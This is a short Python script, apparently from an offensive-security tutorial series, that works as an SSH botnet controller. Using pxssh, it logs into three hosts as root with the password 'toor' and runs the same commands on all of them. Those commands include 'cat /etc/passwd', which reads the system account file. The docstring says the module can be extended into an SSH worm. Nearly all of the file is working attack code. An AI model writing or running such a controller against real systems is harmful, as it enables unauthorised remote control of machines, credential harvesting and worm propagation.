#!/usr/bin/python3

"""
A SSH BotNet!
Final Module - Combining all previous modules with some modifications can be
used to create a SSH worm
"""

from pexpect import pxssh

class Client:
    def __init__( self, host, user, password ):
        self.host     = host
        self.user     = user
        self.password = password
        self.session  = self.Connect()
    
    def Connect( self ):
        try:
            s = pxssh.pxssh()
            s.login( self.host, self.user, self.password )
            return s
        except Exception as e:
            print(e)
            print("[-] Error connecting")
    
    def sendCmd( self, cmd ):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before

BotNet = []


def botnetCmd(cmd):
    for client in BotNet:
        output = client.sendCmd(cmd)
        print("[*] Output from : "+client.host)
        print("[+] "+output+'\n')


def addClient( host, user, password ):
    client = Client( host, user, password)
    BotNet.append(client)


addClient('10.10.10.161','root','toor')
addClient('10.10.10.162','root','toor')
addClient('10.10.10.163','root','toor')

botnetCmd('uname -a')
botnetCmd('cat /etc/passwd')
